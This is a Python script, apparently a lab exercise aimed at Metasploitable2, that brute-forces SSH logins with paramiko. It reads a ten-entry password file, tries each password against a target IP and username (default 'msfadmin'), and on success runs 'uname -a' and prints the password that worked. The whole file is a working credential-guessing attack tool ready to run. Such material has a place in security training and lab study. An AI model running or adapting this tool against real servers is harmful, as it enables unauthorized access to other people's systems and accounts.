import socket
from datetime import datetime
import paramiko, sys
from pathlib import Path

# Define variables
author = "JON TAN"
current_date = datetime.now().strftime("%d/%m/%Y")

# Display the output
print(f"Author: {author}")
print(f"Current Date: {current_date}")

print("###################################################################")
print("                   # ===== ** WARNING ** ===== #                   ")
print("# ===== Ensure to create a virtual environment for paramiko ===== #")
print("# ===== To create venv, run command: python3 -m venv myvenv ===== #")
print("###################################################################")

# Start of code
def load_password_list(password_file):
    file_path = Path(password_file)
    password_list = []

    # Checks input if it's a file or exist
    if not file_path.exists():
        print(f"[!] Password file {file_path} does not exist")
        sys.exit(1)

    # Appends all the passwords into a python list
    with open(file_path, "r", encoding="utf-8") as password_file:
        for line in password_file:
            password_list.append(line.strip())

    # Ensures that there are 10 passwords in the list
    if len(password_list) != 10:
        print(f"[!] Expected 10 passwords but found {len(password_list)} [!]")
        print(f"[!] Please provide a .txt file with 10 passwords, one password per line[!]")
        sys.exit(1)

    return password_list

def paramiko_ssh(target_ip, username, password):
    # Configuring SSH connection using paramiko
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect(hostname=target_ip, username=username, password=password)

    stdin, stdout, stderr = ssh.exec_command("uname -a")

    # Prints system info when connection is established
    print("[+] Successfully accessed SSH server!")
    print(f"[+] Password used: {password}")
    print("\n*** System Info ***")
    print(stdout.read().decode())
    print("[#] Closing SSH connection...")

    # Close the connection to prevent weird interactions
    ssh.close()

    return stdin, stdout, stderr

def main():
    # User inputs
    target_ip = input("Enter Target IP: ").strip()
    target_username = input("Enter Target Username[msfadmin]: ").strip() or "msfadmin"# Expecting msfadmin
    password_file = input("Enter Password file path [one password per line]: ").strip()

    # Creates a password list from password file
    password_list = load_password_list(password_file)

    # Tries the list of passwords
    for password in password_list:
        try:
            print("[*] Trying password: ", password)
            paramiko_ssh(target_ip, target_username, password)
            sys.exit(0)
        except paramiko.AuthenticationException as e:
            print(f"[!] {e} Incorrect username or password...\n")
        except paramiko.SSHException as e:
            print(f"[!] SSH/connection error: {e}\n")
            sys.exit(2)
        except socket.error:
            # Metasploitable2 is not on NAT network || invalid IP address input || not turned on
            print("[!] Connection failed\n")
            sys.exit(2)



    # If it hits here, it means that the password is not in the list
    print("[-] Password not found in the password file...")
    sys.exit(1)

if __name__ == "__main__":
    main()
